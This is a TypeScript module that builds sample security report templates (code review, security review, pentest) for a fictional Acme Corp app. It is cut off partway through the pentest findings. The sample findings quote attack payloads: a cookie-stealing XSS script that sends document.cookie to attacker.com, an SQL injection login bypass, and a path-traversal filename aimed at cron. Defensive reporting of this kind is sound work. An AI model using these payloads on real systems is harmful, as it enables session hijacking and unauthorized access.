import { existsSync, readFileSync } from "fs";
import { join } from "path";

export type PreviewType = "code-review" | "sec-review" | "pentest" | "scoping" | "testplan" | "finding";

export interface ReportDefaults {
  reviewerOrg?:     string;
  reviewerContact?: string;
  reviewerEmail?:   string;
  classification?:  string;
  securityColors?: {
    critical?: string;
    high?:     string;
    medium?:   string;
    low?:      string;
  };
}

const TYPE_TITLES: Record<PreviewType, string> = {
  "code-review": "Code Review — IA Style Preview",
  "sec-review":  "Security Review — IA Style Preview",
  "pentest":     "Penetration Test — IA Style Preview",
  "scoping":     "Scoping Document — IA Style Preview",
  "testplan":    "Test Plan — IA Style Preview",
  "finding":     "Finding — IA Style Preview",
};

const LOGO_EXTS = ["webp", "png", "svg", "jpg", "jpeg"];

function findLogo(frameworkRoot: string): string | null {
  for (const ext of LOGO_EXTS) {
    const p = join(frameworkRoot, `private/brand/assets/logo.${ext}`);
    if (existsSync(p)) {
      const mime = ext === "svg" ? "image/svg+xml" : `image/${ext === "jpg" ? "jpeg" : ext}`;
      const b64 = readFileSync(p).toString("base64");
      return `data:${mime};base64,${b64}`;
    }
  }
  return null;
}

const DRAFT_CSS = `
        <style>
        body::before {
          content: "DRAFT";
          position: fixed; top: 50%; left: 50%;
          transform: translate(-50%, -50%) rotate(-35deg);
          font-size: 18vw; font-weight: 900;
          color: rgba(180, 0, 0, 0.07);
          pointer-events: none; z-index: 9999;
          white-space: nowrap; letter-spacing: 0.15em; user-select: none;
        }
        </style>`;

function frontmatter(theme: string, frameworkRoot: string, title: string, draft = false): string {
  const styles = `${frameworkRoot}/private/brand/assets/styles.css`;
  const scss   = `${frameworkRoot}/private/brand/assets/theme-light.scss`;
  const draftBlock = draft
    ? `\n    include-in-header:\n      text: |${DRAFT_CSS}`
    : "";
  return `---
title: "${title}"${draft ? '\nsubtitle: "DRAFT — Pre-Decisional | Not for Distribution"' : ""}
format:
  html:
    theme:
      - ${theme}
      - ${scss}
    css: ${styles}
    self-contained: true
    toc: true
    toc-depth: 2
    toc-location: left
    number-sections: false${draftBlock}
execute:
  echo: false
---`;
}

function logoLine(logoPath: string | null): string {
  return logoPath ? `\n![](${logoPath}){.nolabel width=180}\n` : "";
}

/** Mermaid pie chart with brand severity colors injected via %%{init}%% */
function riskChart(slices: Array<[string, number]>, c: NonNullable<ReportDefaults["securityColors"]>): string {
  const palette: Record<string, string> = {
    critical: c.critical ?? "#7C3AED",
    high:     c.high     ?? "#DC2626",
    medium:   c.medium   ?? "#EA580C",
    low:      c.low      ?? "#16A34A",
  };
  const themeVars = slices
    .map(([label], i) => `"pie${i + 1}": "${palette[label.toLowerCase().split(" ")[0]] ?? "#6B7280"}"`)
    .join(", ");
  const entries = slices.map(([l, v]) => `  "${l}" : ${v}`).join("\n");
  return "```{mermaid}\n" +
    `%%{init: {"theme": "base", "themeVariables": {${themeVars}}}}%%\n` +
    "pie title Findings by Severity\n" + entries + "\n```";
}

/** Grey screenshot/image placeholder block */
function imgPlaceholder(caption: string, height = 180): string {
  return `<div style="background:#f1f5f9;border:2px dashed #cbd5e1;border-radius:6px;` +
    `height:${height}px;display:flex;align-items:center;justify-content:center;` +
    `color:#94a3b8;font-size:.85rem;margin:1rem 0;text-align:center;padding:1rem;">` +
    `&#128247; ${caption}</div>`;
}

/** Mermaid flowchart using string concatenation to avoid backtick escaping */
function flowChart(content: string): string {
  return "```{mermaid}\n" + content + "\n```";
}

/** Classification notice div */
function classificationDiv(cls: string): string {
  const labels: Record<string, string> = {
    confidential: "CONFIDENTIAL — For Authorized Recipients Only",
    restricted:   "RESTRICTED — Internal Use Only",
    internal:     "INTERNAL — Not for External Distribution",
    public:       "PUBLIC — Approved for External Release",
  };
  const safe = cls.toLowerCase();
  return `::: {.classification-notice .${safe}}\n${labels[safe] ?? cls.toUpperCase()}\n:::`;
}

// ─── Code Review ─────────────────────────────────────────────────────────────

function codeReviewBody(logo: string | null, d: ReportDefaults): string {
  const reviewer = d.reviewerOrg ?? "Intelligence Adjacent";
  const cls      = d.classification ?? "confidential";
  const colors   = d.securityColors ?? {};
  return `
::: {.report-header}
${logoLine(logo)}
# Security Code Review {.unnumbered .unlisted}
<span class="report-target">sample-app</span>

::: {.report-header-meta}
<span><span class="meta-label">Project</span>sample-app</span>
<span><span class="meta-label">Organization</span>Acme Corp</span>
<span><span class="meta-label">Report Date</span>2026-02-27</span>
<span><span class="meta-label">Engagement ID</span>CR-2026-001</span>
<span><span class="meta-label">Lead Reviewer</span>${reviewer}</span>
:::
:::

${classificationDiv(cls)}

# Executive Summary

Intelligence Adjacent conducted a Security Code Review of **sample-app** for Acme Corp from
2026-02-13 through 2026-02-27. The assessment reviewed approximately 14,200 lines of TypeScript
across 68 files, covering authentication, file handling, API routing, and data persistence layers.

The review identified **7 findings**: 0 critical, 2 high, 4 medium, and 1 low severity. The most
significant risks relate to insufficient input validation in the file upload pipeline and missing
access controls on several internal API routes. No evidence of prior security assessment was found
in the codebase; several issues suggest security was not a primary consideration during initial
development. Immediate remediation is recommended for the two high-severity findings before the
application proceeds to production deployment.

## Risk Distribution

| Priority | Severity | Count |
|----------|----------|-------|
| P0 | [Critical]{.badge-critical} | 0 |
| P1 | [High]{.badge-high} | 2 |
| P2 | [Medium]{.badge-medium} | 4 |
| P3 | [Low]{.badge-low} | 1 |
| | **Total** | **7** |

${riskChart([["High", 2], ["Medium", 4], ["Low", 1]], colors)}

## Priority Actions

- **CR-001** — Path Traversal in File Upload Handler (\`src/handlers/upload.ts:47\`)
- **CR-002** — Missing Authorization on Internal Admin Routes (\`src/routes/admin.ts:12\`)

## Positive Practices Observed

- Consistent use of TypeScript strict mode across the codebase
- Environment-based configuration with no secrets in application source
- Structured logging with request correlation IDs

# Scope

## In Scope

| Component | Type | Description |
|-----------|------|-------------|
| \`src/handlers/\` | Application code | HTTP request handlers |
| \`src/routes/\` | Application code | Express route definitions |
| \`src/models/\` | Application code | Data model and ORM layer |
| \`src/middleware/\` | Application code | Auth, logging, validation middleware |
| \`src/utils/\` | Application code | Shared utility functions |

## Out of Scope

- \`node_modules/\` — third-party dependencies
- \`tests/\` — test suite (reviewed for secret exposure only)
- Infrastructure configuration and deployment scripts
- Database schema and migration files

## Methodology

The review applied a four-pass analysis: (1) automated static analysis with Semgrep and
ESLint security rules, (2) manual taint analysis of all external input paths, (3) business
logic review against the provided API specification, and (4) dependency audit against the
OSV database.

# Data Flow

External input enters the application through three primary surfaces: the REST API
(\`/api/v1/\`), file uploads (\`/api/v1/upload\`), and webhook callbacks (\`/webhooks/\`).
All paths route through Express middleware before reaching handlers.

${flowChart("flowchart LR\n" +
"  Browser[Browser] --> API[REST API]\n" +
"  API --> Auth[Auth Middleware]\n" +
"  Auth -->|Valid JWT| Handler[Route Handler]\n" +
"  Auth -->|Invalid| Reject[401 Reject]\n" +
"  Handler --> DB[(Database)]\n" +
"  Handler --> Files[(File Store)]\n" +
"  Handler --> S3[S3 Upload]")}

Authentication state is carried in JWT tokens validated by \`src/middleware/auth.ts\`.
File data flows from the multipart parser to the upload handler to local disk to the async
background processor. The background processor runs with elevated filesystem permissions,
making the upload path a high-value target.

# Findings

## High Severity

::: {.finding-high}
#### CR-001: Path Traversal in File Upload Handler

**Severity:** [High]{.badge-high} | **Priority:** P1 | **Confidence:** HIGH

**CWE:** CWE-22 | **OWASP:** A01:2021 — Broken Access Control

**Location:** \`src/handlers/upload.ts:47\`

**Status:** Open

---

## Description

The file upload handler at \`saveUpload()\` concatenates a user-supplied filename directly
into the destination path without sanitization. An attacker can supply a filename such as
\`../../etc/cron.d/backdoor\` to write files to arbitrary filesystem locations.

## Affected Components

File: \`src/handlers/upload.ts\`
Lines: 47–63

\`\`\`typescript
// Vulnerable: user controls filename
const destPath = path.join(UPLOAD_DIR, req.body.filename);
await fs.writeFile(destPath, fileBuffer);
\`\`\`

## Root Cause

The background file processor runs as a privileged user. An attacker who can write to
\`/etc/cron.d/\` or \`~/.ssh/authorized_keys\` achieves persistent system access. This is
exploitable by any authenticated user with upload permissions.
:::

::: {.finding-high}
#### CR-002: Missing Authorization on Admin Routes

**Severity:** [High]{.badge-high} | **Priority:** P1 | **Confidence:** HIGH

**CWE:** CWE-862 | **OWASP:** A01:2021 — Broken Access Control

**Location:** \`src/routes/admin.ts:12\`

**Status:** Open

---

## Description

The admin route group at \`/api/v1/admin/\` applies authentication middleware (JWT
validation) but not authorization middleware (role check). Any authenticated user —
regardless of role — can access user management, audit log export, and configuration
endpoints.

## Affected Components

File: \`src/routes/admin.ts\`
Lines: 12–31

\`\`\`typescript
// authenticate() validates JWT; no role check follows
router.use(authenticate());

router.get('/users',   listAllUsers);      // should require ADMIN role
router.delete('/users/:id', deleteUser);   // should require ADMIN role
router.get('/audit-log', exportAuditLog);  // should require ADMIN role
\`\`\`

## Root Cause

Standard user accounts can enumerate all users, delete accounts, and export the full
audit log. This represents a significant privilege escalation for any attacker who
obtains a valid user session.
:::

## Medium Severity

::: {.finding-medium}
#### CR-003: Missing Rate Limiting on Authentication Endpoint

**Severity:** [Medium]{.badge-medium} | **Priority:** P2 | **Confidence:** HIGH

**CWE:** CWE-307 | **OWASP:** A07:2021 — Identification and Authentication Failures

**Location:** \`src/routes/auth.ts:28\`

**Status:** Open

---

## Description

The \`POST /api/v1/auth/login\` endpoint performs no rate limiting or account lockout,
permitting unlimited credential guessing attempts without throttling or detection.

## Affected Components

File: \`src/routes/auth.ts\` — Lines: 28–52

## Root Cause

Automated credential-stuffing tools can test thousands of username/password combinations
per minute. Combined with the application's use of distinct error messages
(\`"Invalid password"\` vs \`"User not found"\`), account enumeration is also possible.
:::

::: {.finding-medium}
#### CR-004: Hardcoded Credentials in Test Files

**Severity:** [Medium]{.badge-medium} | **Priority:** P2 | **Confidence:** HIGH

**CWE:** CWE-798 | **OWASP:** A07:2021 — Identification and Authentication Failures

**Location:** \`src/utils/seed.ts:8\`

**Status:** Open

---

## Description

A seed script used for development contains hardcoded administrator credentials
(\`admin / Admin123!\`) that match the format of production bootstrap credentials
referenced in deployment documentation.

## Affected Components

File: \`src/utils/seed.ts\` — Lines: 8–15

## Root Cause

If the seed script is executed against the production database, or if the deployment
documentation is accessed by an unauthorized party, an attacker obtains working
administrator credentials.
:::

## Low Severity

::: {.finding-low}
#### CR-005: Verbose Error Messages in Production

**Severity:** [Low]{.badge-low} | **Priority:** P3 | **Confidence:** MEDIUM

**CWE:** CWE-209 | **OWASP:** A05:2021 — Security Misconfiguration

**Location:** \`src/middleware/errorHandler.ts:31\`

**Status:** Open

---

## Description

Unhandled exceptions return full stack traces and internal file paths to the client in
production mode. This aids an attacker in mapping the application's internal structure.
:::

# Recommendations

## Immediate (P0–P1)

| Finding | Action | Effort |
|---------|--------|--------|
| CR-001 | Replace \`path.join(UPLOAD_DIR, filename)\` with \`path.basename()\` and allowlist validation | Low |
| CR-002 | Add \`requireRole('ADMIN')\` middleware to all admin route group handlers | Low |

## Short-Term (P2)

- Implement express-rate-limit on \`/api/v1/auth/login\` (max 5 requests per 15 min per IP)
- Remove hardcoded credentials from \`seed.ts\`; use environment variables for bootstrap values
- Normalize authentication error messages to a single generic response
- Add input sanitization to all user-supplied file metadata fields

## Long-Term

- Integrate SAST tooling (Semgrep) into the CI pipeline with a blocking security gate
- Adopt a secrets scanning pre-commit hook (e.g., \`detect-secrets\` or \`trufflesecurity/trufflehog\`)
- Schedule quarterly security reviews as the codebase grows

# Appendices

## Methodology References

- OWASP Top 10 2021 (https://owasp.org/Top10/)
- CWE/SANS Top 25 Most Dangerous Software Weaknesses
- NIST SSDF 1.1 — Secure Software Development Framework

## CVSS Scoring Summary

| Finding ID | CVSS Vector | Score | Severity |
|------------|-------------|-------|----------|
| CR-001 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.0 | [High]{.badge-high} |
| CR-002 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | 8.1 | [High]{.badge-high} |
| CR-003 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 | [Medium]{.badge-medium} |
| CR-004 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 | [Medium]{.badge-medium} |
| CR-005 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 | [Low]{.badge-low} |

## Tools Used

- Semgrep (static analysis)
- ESLint security plugin (\`eslint-plugin-security\`)
- npm audit (dependency vulnerability scan)
- Manual code review
`;
}

// ─── Security Review ──────────────────────────────────────────────────────────

function secReviewBody(logo: string | null, d: ReportDefaults): string {
  const reviewer = d.reviewerOrg ?? "Intelligence Adjacent";
  const cls      = d.classification ?? "confidential";
  const colors   = d.securityColors ?? {};
  return `
::: {.report-header}
${logoLine(logo)}
# Security Review {.unnumbered .unlisted}
<span class="report-target">sample-app</span>

::: {.report-header-meta}
<span><span class="meta-label">Project</span>sample-app</span>
<span><span class="meta-label">Organization</span>Acme Corp</span>
<span><span class="meta-label">Report Date</span>2026-02-27</span>
<span><span class="meta-label">Engagement ID</span>SR-2026-001</span>
<span><span class="meta-label">Lead Reviewer</span>${reviewer}</span>
:::
:::

${classificationDiv(cls)}

# Executive Summary

Intelligence Adjacent conducted a Security Review of **sample-app** for Acme Corp from
2026-02-10 through 2026-02-27. The review applied STRIDE threat modeling across five
security domains: authentication, data protection, access control, secrets management,
and network exposure.

The review identified **8 findings**: 1 critical, 2 high, 3 medium, and 2 low severity.
The critical finding — an unauthenticated administrative interface — presents an immediate
risk of full system compromise and must be remediated before any external exposure.
Several medium findings indicate systemic gaps in secrets management and dependency hygiene
that should be addressed through process improvements.

## Risk Distribution

| Priority | Severity | Count |
|----------|----------|-------|
| P0 | [Critical]{.badge-critical} | 1 |
| P1 | [High]{.badge-high} | 2 |
| P2 | [Medium]{.badge-medium} | 3 |
| P3 | [Low]{.badge-low} | 2 |
| | **Total** | **8** |

${riskChart([["Critical", 1], ["High", 2], ["Medium", 3], ["Low", 2]], colors)}

## Priority Actions

- **SR-001** — Unauthenticated Administrative Interface (\`/admin\` — no auth required)
- **SR-002** — Secrets Stored in Version Control (\`.env.example\` contains production values)

## Positive Practices Observed

- TLS enforced on all endpoints; HSTS header present
- Structured dependency management with lockfile committed
- Sensitive fields excluded from API responses via DTO pattern

# Domain Coverage

| Domain | Areas Reviewed | Status |
|--------|---------------|--------|
| A — Authentication & Access Control | Login flow, session management, RBAC | [Findings]{.badge-high} |
| B — Data Protection | Encryption at rest/transit, PII handling | [Findings]{.badge-medium} |
| C — Secrets Management | Env config, CI secrets, key rotation | [Findings]{.badge-critical} |
| D — Network Exposure | Firewall rules, exposed services, headers | [Compliant]{.status-compliant} |
| E — Dependency Security | CVE audit, update cadence, SCA tooling | [Partial]{.status-partial} |

# Threat Model

## STRIDE Coverage

| Threat Category | Domain | Finding Count |
|----------------|--------|--------------|
| Spoofing | A — Authentication | 2 |
| Tampering | B — Data Protection | 1 |
| Repudiation | A — Authentication | 0 |
| Information Disclosure | C — Secrets Management | 2 |
| Denial of Service | D — Network Exposure | 0 |
| Elevation of Privilege | A — Access Control | 1 |

## Attack Surface

The application presents three primary attack surfaces: (1) the public-facing REST API exposed on
port 443, (2) the administrative dashboard accessible at \`/admin\` with no authentication gate, and
(3) the deployment pipeline which consumes secrets stored in version control. The administrative
dashboard represents the highest-priority attack surface given the complete absence of access
controls.

${flowChart("flowchart TD\n" +
"  Internet([Internet]) --> FW[Firewall]\n" +
"  FW --> LB[Load Balancer]\n" +
"  LB --> Web[Web Tier]\n" +
"  LB --> API[API Tier]\n" +
"  Web --> Cache[(Redis Cache)]\n" +
"  API --> Cache\n" +
"  API --> DB[(Database)]\n" +
"  API --> Ext[External Services]")}

# Findings

## Critical

::: {.finding-critical}
#### SR-001: Unauthenticated Administrative Interface

**Severity:** [Critical]{.badge-critical} | **Priority:** P0 | **Domain:** A — Access Control

**CWE:** CWE-306 | **STRIDE:** Elevation of Privilege / Spoofing

**Status:** Open

---

## Description

The administrative dashboard at \`/admin\` and its API at \`/api/admin/\` accept requests
without any authentication or authorization check. The interface exposes user management,
system configuration, audit log access, and a database query console.

## Affected Components

Network: \`http://[host]/admin\` — accessible from any IP with no credentials required.

\`\`\`
GET /admin/users HTTP/1.1
Host: app.example.com

HTTP/1.1 200 OK
[Full user list with password hashes returned]
\`\`\`

## Root Cause

Any attacker with network access achieves complete system compromise: create admin
accounts, export all user data including credentials, execute arbitrary database queries,
and disable security controls. This is immediately exploitable with no prerequisites.
:::

## High

::: {.finding-high}
#### SR-002: Secrets Stored in Version Control

**Severity:** [High]{.badge-high} | **Priority:** P1 | **Domain:** C — Secrets Management

**CWE:** CWE-312 | **STRIDE:** Information Disclosure

**Status:** Open

---

## Description

The file \`.env.example\` committed to the repository contains production values for
database credentials, API keys, and JWT signing secrets. These are not placeholder values —
they match the format and character sets of active secrets verified against the live
environment.

## Affected Components

File: \`.env.example\` — committed to \`main\` branch (git log shows this file has been
present since initial commit, 847 commits ago).

## Root Cause

Any person with repository read access — including former employees, contractors, or
anyone who forks the repository — obtains live production credentials. Rotation requires
coordinated effort across all dependent services.
:::

::: {.finding-high}
#### SR-003: JWT Symmetric Key Under-Rotated

**Severity:** [High]{.badge-high} | **Priority:** P1 | **Domain:** A — Authentication

**CWE:** CWE-330 | **STRIDE:** Spoofing

**Status:** Open

---

## Description

The application uses HMAC-SHA256 (symmetric) JWT signing with a static secret that has
not been rotated since initial deployment (confirmed via git history). The secret length
(32 characters) meets the minimum but not the recommended length for HS256.

## Affected Components

File: \`src/middleware/auth.ts\` — Lines: 8–12. Secret sourced from \`JWT_SECRET\` env var,
which is exposed in \`.env.example\` (see SR-002).

## Root Cause

A compromised secret enables forgery of arbitrary JWT tokens for any user, including
administrators. The symmetric scheme means any service holding the verification key can
also forge tokens.
:::

## Medium

::: {.finding-medium}
#### SR-004: CVE in express-fileupload Dependency

**Severity:** [Medium]{.badge-medium} | **Priority:** P2 | **Domain:** E — Dependencies

**CWE:** CWE-1395 | **OWASP:** A06:2021 — Vulnerable and Outdated Components

**Status:** Open

---

## Description

\`express-fileupload@1.4.0\` is pinned at a version with a known prototype pollution
vulnerability (CVE-2022-27261, CVSS 7.5). The dependency is used directly in the file
upload handler. Prototype pollution in the file upload library can interact with other
attack surface in the application to expand exploitability.
:::

::: {.finding-medium}
#### SR-005: Missing Security Headers

**Severity:** [Medium]{.badge-medium} | **Priority:** P2 | **Domain:** D — Network Exposure

**CWE:** CWE-693 | **OWASP:** A05:2021 — Security Misconfiguration

**Status:** Open

---

## Description

The application does not set \`X-Frame-Options\` or \`X-Content-Type-Options\` response
headers. The absence of \`X-Frame-Options\` permits clickjacking attacks. The absence of
\`X-Content-Type-Options\` permits MIME-sniffing attacks on file downloads.
:::

# Compliance Mapping

| Control | Framework | Status | Finding |
|---------|-----------|--------|---------|
| Input Validation | OWASP A03 | [Non-Compliant]{.status-non-compliant} | SR-001 |
| Secrets Management | NIST SSDF PW.7 | [Non-Compliant]{.status-non-compliant} | SR-002, SR-003 |
| Dependency Management | OWASP A06 | [Partial]{.status-partial} | SR-004 |
| Network Security | CIS Control 12 | [Compliant]{.status-compliant} | — |

# Recommendations

## Immediate

Add authentication to \`/admin\` and \`/api/admin/\` before any external network exposure.
Rotate all secrets exposed in \`.env.example\` immediately; audit git history for additional
secret exposure and consider the repository compromised until rotation is confirmed complete.

## Short-Term

| Finding | Action | Owner | Effort |
|---------|--------|-------|--------|
| SR-002 | Remove secrets from git history (BFG Repo Cleaner) | DevOps | Medium |
| SR-003 | Migrate to RS256 (asymmetric); implement 30-day rotation | Backend | Medium |
| SR-004 | Update express-fileupload to >= 1.4.1 | Backend | Low |
| SR-005 | Add helmet.js middleware to set all security headers | Backend | Low |

## Process Improvements

- Implement pre-commit secret scanning (trufflesecurity/trufflehog or detect-secrets)
- Add Dependabot or Renovate for automated dependency updates with security alerts
- Require security sign-off for any new internet-exposed endpoints
- Adopt STRIDE threat modeling for all new feature design reviews

# Appendices

## Frameworks Referenced

- OWASP Top 10 2021
- NIST SSDF 1.1 — Secure Software Development Framework
- CIS Controls v8
- STRIDE Threat Modeling (Microsoft SDL)

## Threat Modeling Methodology

This review applied both STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure,
Denial of Service, Elevation of Privilege) and elements of PASTA (Process for Attack
Simulation and Threat Analysis) to enumerate threats against each application component
and map them to observed findings.

## Dependency Audit Summary

| Package | Version | CVE | CVSS | Action |
|---------|---------|-----|------|--------|
| express-fileupload | 1.4.0 | CVE-2022-27261 | 7.5 | Upgrade to >= 1.4.1 |
| jsonwebtoken | 8.5.1 | CVE-2022-23529 | 7.6 | Upgrade to >= 9.0.0 |
`;
}

// ─── Pentest ──────────────────────────────────────────────────────────────────

function pentestBody(logo: string | null, d: ReportDefaults): string {
  const reviewer = d.reviewerOrg ?? "Intelligence Adjacent";
  const cls      = d.classification ?? "confidential";
  const colors   = d.securityColors ?? {};
  return `
::: {.report-header}
${logoLine(logo)}
# Penetration Test Report {.unnumbered .unlisted}
<span class="report-target">Q1 2026 External Assessment</span>

::: {.report-header-meta}
<span><span class="meta-label">Target</span>api.sample.com</span>
<span><span class="meta-label">Organization</span>Acme Corp</span>
<span><span class="meta-label">Report Date</span>2026-02-27</span>
<span><span class="meta-label">Engagement ID</span>PT-2026-001</span>
<span><span class="meta-label">Lead Tester</span>${reviewer}</span>
:::
:::

${classificationDiv(cls)}

# Executive Summary

Intelligence Adjacent performed an external black-box penetration test against
**api.sample.com** and its associated web application from 2026-02-17 through 2026-02-21.
Testing was conducted from the internet without prior knowledge of the application's
internals, simulating an unauthenticated external attacker.

The assessment identified **11 findings**: 1 critical, 3 high, 5 medium, and 2 low severity.
The critical finding — SQL injection in the authentication endpoint — allows complete
authentication bypass and was verified to provide access to the full user database. The
three high findings compound the critical risk by enabling lateral movement and data
exfiltration once initial access is established. Overall security posture is assessed as
**POOR**. The application should not process production data until P0 and P1 findings are resolved.

## Risk Distribution

| Priority | Severity | Count |
|----------|----------|-------|
| P0 | [Critical]{.badge-critical} | 1 |
| P1 | [High]{.badge-high} | 3 |
| P2 | [Medium]{.badge-medium} | 5 |
| P3 | [Low]{.badge-low} | 2 |
| | **Total** | **11** |

${riskChart([["Critical", 1], ["High", 3], ["Medium", 5], ["Low", 2]], colors)}

## Priority Actions

- **PT-001** — SQL Injection: Authentication Bypass (\`POST /api/v1/auth\`)
- **PT-002** — Stored XSS: Admin Dashboard (\`/api/v1/profile\`)
- **PT-003** — IDOR: Arbitrary User Data Access (\`GET /api/v1/users/:id\`)

## Overall Assessment

| Dimension | Assessment |
|-----------|-----------|
| Posture | POOR |
| Attack Complexity | Low — multiple critical paths require no privileges |
| Data at Risk | Full user database (12,483 records), admin credentials |
| Recommended Action | Halt production deployment; remediate P0/P1 before launch |

# Scope & Methodology

## Target Scope

| Target | Type | Description |
|--------|------|-------------|
| \`api.sample.com\` | Web Application | Primary REST API |
| \`app.sample.com\` | Web Application | Customer-facing frontend |
| \`admin.sample.com\` | Web Application | Administrative dashboard |

## Out of Scope

- Internal network and cloud infrastructure
- Third-party integrations and payment processors
- Social engineering and phishing
- Denial-of-service testing

## Methodology

Testing followed the PTES (Penetration Testing Execution Standard) methodology:

1. **Reconnaissance** — Passive OSINT, DNS enumeration, SSL certificate analysis
2. **Scanning** — Port scanning (Nmap), web crawling (Feroxbuster), parameter discovery
3. **Exploitation** — Manual exploitation of identified vulnerabilities
4. **Post-Exploitation** — Privilege escalation and lateral movement (within authorized scope)
5. **Reporting** — Evidence collection and remediation guidance

## Timeline

| Phase | Start | End | Duration |
|-------|-------|-----|----------|
| Reconnaissance | 2026-02-17 | 2026-02-17 | 1 day |
| Scanning | 2026-02-18 | 2026-02-18 | 1 day |
| Exploitation | 2026-02-19 | 2026-02-20 | 2 days |
| Post-Exploitation | 2026-02-20 | 2026-02-21 | 1 day |
| Reporting | 2026-02-21 | 2026-02-27 | 5 days |

# Attack Surface

## Enumeration Summary

| Surface | Endpoints | Auth Required | Findings Found |
|---------|-----------|---------------|---------------|
| Public API | 34 | No | 4 |
| Authenticated API | 61 | Yes (JWT) | 6 |
| Admin Dashboard | 12 | Yes (JWT + Role) | 1 |

## Network Exposure

The application is accessible over HTTPS on port 443. Port scanning identified ports 22
(SSH), 80 (HTTP redirect), and 443 (HTTPS) open. Port 8080 was found open and serving an
unauthenticated internal metrics endpoint exposing runtime configuration including database
connection strings.

${imgPlaceholder("Screenshot — Nmap scan results showing open ports and services")}

${flowChart("flowchart LR\n" +
"  Recon[Recon] --> Enum[Enumeration]\n" +
"  Enum --> Access[Initial Access]\n" +
"  Access --> PrivEsc[Priv Escalation]\n" +
"  PrivEsc --> Pivot[Lateral Movement]\n" +
"  Pivot --> Impact[Data Exfiltration]")}

# Reconnaissance

## OSINT Findings

- Old subdomains discovered in certificate transparency logs: \`staging.sample.com\`, \`dev.sample.com\`
- Internal file path leaked in \`/robots.txt\`: \`Disallow: /internal/\` reveals internal route structure
- Admin subdomain (\`admin.sample.com\`) exposed with no authentication required
- GitHub repository indexed by search engines; \`.env.example\` with production secrets publicly visible

## Technology Stack

| Layer | Technology | Version | Source |
|-------|-----------|---------|--------|
| Runtime | Node.js | 18.12.0 | HTTP response headers |
| Framework | Express | 4.18.2 | X-Powered-By header |
| Database | PostgreSQL | 14.6 | Error messages |
| Auth | JWT (HS256) | — | Token inspection |

${imgPlaceholder("Screenshot — Feroxbuster directory enumeration results")}

# Findings

## Critical

::: {.finding-critical}
#### PT-001: SQL Injection — Authentication Bypass

**Severity:** [Critical]{.badge-critical} | **CVSS:** 9.8 | **Priority:** P0

**CWE:** CWE-89 | **OWASP:** A03:2021 — Injection

**Status:** Open | **Exploited:** Yes

---

**Description**

The \`POST /api/v1/auth\` endpoint is vulnerable to SQL injection via the \`username\`
parameter. The backend constructs a SQL query using string concatenation without
parameterization, allowing an attacker to inject arbitrary SQL and completely bypass
the authentication check.

**Evidence**

Request:

\`\`\`http
POST /api/v1/auth HTTP/1.1
Host: api.sample.com
Content-Type: application/json

{"username": "' OR '1'='1' --", "password": "x"}
\`\`\`

Response:

\`\`\`json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": { "id": 1, "email": "admin@sample.com", "role": "admin" }
}
\`\`\`

Authentication was bypassed and an administrator JWT was issued. The injected session
was used to access all subsequent authenticated findings.

**Remediation**

Replace string concatenation with parameterized queries (prepared statements) using
the ORM's built-in query builder. All database queries accepting user input must use
bound parameters.
:::

## High

::: {.finding-high}
#### PT-002: Stored XSS in Admin Dashboard

**Severity:** [High]{.badge-high} | **CVSS:** 8.2 | **Priority:** P1

**CWE:** CWE-79 | **OWASP:** A03:2021 — Injection

**Status:** Open | **Exploited:** Yes

---

**Description**

User-supplied display names are stored in the database and rendered without HTML encoding
in the administrative dashboard at \`/admin/users\`. Any authenticated user can set their
display name to a JavaScript payload that executes in the context of every administrator
who views the users page.

**Evidence**

Payload set via \`PUT /api/v1/profile\`:

\`\`\`javascript
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
\`\`\`

Payload executed in the admin browser session and exfiltrated the admin session cookie,
providing persistent administrative access independent of the JWT.

**Remediation**

Apply HTML entity encoding to all user-supplied data rendered in the DOM. Implement a
Content-Security-Policy header with \`script-src 'self'\` to limit inline script execution.
:::

::: {.finding-high}
#### PT-003: IDOR — Arbitrary User Data Access

**Severity:** [High]{.badge-high} | **CVSS:** 7.5 | **Priority:** P1

**CWE:** CWE-639 | **OWASP:** A01:2021 — Broken Access Control

**Status:** Open | **Exploited:** Yes

---

**Description**

The \`GET /api/v1/users/:id\` endpoint returns full user records (including hashed
passwords, phone numbers, and addresses) for any user ID supplied in the path. The
endpoint validates only that the requester is authenticated — it does not verify that
the requester owns the requested record.

**Evidence**

Authenticated as user ID 847, successfully retrieved the profile of user ID 1 (admin):

\`\`\`
GET /api/v1/users/1 HTTP/1.1
Authorization: Bearer [user-847-token]

HTTP/1.1 200 OK
{"id":1,"email":"admin@sample.com","passwordHash":"$2b$12$...","phone":"555-0100",...}
\`\`\`

All 12,483 user records were accessible by incrementing the ID parameter.

**Remediation**

Enforce ownership checks on all user record endpoints. The backend must verify that
\`req.user.id === params.id\` or that the requester holds an explicit admin role before
returning the record.
:::

::: {.finding-high}
#### PT-004: Server-Side Request Forgery (SSRF)

**Severity:** [High]{.badge-high} | **CVSS:** 7.3 | **Priority:** P1

**CWE:** CWE-918 | **OWASP:** A10:2021 — Server-Side Request Forgery

**Status:** Open | **Exploited:** Partial

---

**Description**

The \`POST /api/v1/webhooks/test\` endpoint accepts a user-supplied URL and makes an
outbound HTTP request to that URL to verify reachability. No allowlist or protocol
restriction is applied. This permits an attacker to probe internal network services
not accessible from the internet.

${imgPlaceholder("Screenshot — SSRF probe response revealing internal metadata service")}

**Remediation**

Restrict outbound requests to an explicit allowlist of approved domains. Block requests
to RFC-1918 private address ranges and cloud metadata endpoints (169.254.169.254).
:::

## Medium

::: {.finding-medium}
#### PT-005: Exposed .git Directory

**Severity:** [Medium]{.badge-medium} | **Priority:** P2

**CWE:** CWE-538 | **OWASP:** A05:2021 — Security Misconfiguration

**Status:** Open

**Description**

The \`.git/\` directory is accessible via the web server at \`https://app.sample.com/.git/\`.
This exposes the full git history, enabling reconstruction of the application's source
code including any secrets committed historically.
:::

::: {.finding-medium}
#### PT-006: Missing Security Headers

**Severity:** [Medium]{.badge-medium} | **Priority:** P2

**CWE:** CWE-693 | **OWASP:** A05:2021 — Security Misconfiguration

**Status:** Open

**Description**

